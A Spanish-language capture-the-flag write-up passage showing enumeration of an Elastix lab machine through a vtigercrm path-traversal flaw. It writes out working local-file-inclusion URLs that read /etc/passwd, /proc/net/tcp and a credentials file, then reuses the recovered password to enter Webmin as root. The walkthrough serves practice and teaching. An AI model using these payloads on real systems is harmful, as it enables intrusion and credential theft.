## Vulnerability Assessment {-}

### Elastix {-}

```bash
searchsploit elastix
```

Aqui vemos una serie de exploits y un script escrito en perl nos llama la atencion, porque permite hacer un
Local File Inclusion.

```bash
searchsploit -x 37637
```

Vemos que el exploit pasa por una url que usa path traversal `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
En este caso el fichero `/etc/amportal.conf` lo miramos mas tarde y empezamos primero con enumerar informaciones de la maquina.

Le metemos en firefox la url siguiente: `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
y podemos ver el fichero.

Vemos que hay multiples usuarios con una `/bin/bash`

- fanis
- spamfilter
- asterisk
- cyrus
- mysql
- root

Usamos el LFI para enumerar la maquina

```bash
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//proc/net/tcp%00&module=Accounts&action
```

El fib_trie no nos muestra nada pero el tcp nos muestra los puertos internos que estan abiertos. Lo copiamos y lo pegamos en un fichero.
Como los puertos estan representado de forma hexadecimal, tenemos que tratar la data.

```bash
cat data.txt | tr ':' ' ' | awk '{print $3}' | sort -u

python3
>>> 0x0016
22
>>> 0x0019
25
>>> 0x0050
80
...
```

En el caso de un LFI ficheros interessantes podrian tambien ser `/proc/shed_debug` y `/proc/shedstat`. En este caso no sirbe pero esta
bien tenerlo en cuenta.

Si miramos el fichero del exploit `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..///etc/amportal.conf%00&module=Accounts&action`
Vemos un fichero de configuracion con credenciales para una base de datos.

Si vamos por el panel de login y probamos usuarios, nos podemos connectar como el usuario admin.

Como tenemos contraseñas, intentamos connectarnos con el usuario admin pero no va.
Intentamos como el usuario root y la misma contraseña y entramos en el panel de configuracion de **webmin**.

> [ ! ] NOTAS: Tito S4vitar nos avanza que se puede ganar accesso al systema desde el dashboard de elastix y tambien del webmin pero aqui tiraremos de otras vias.

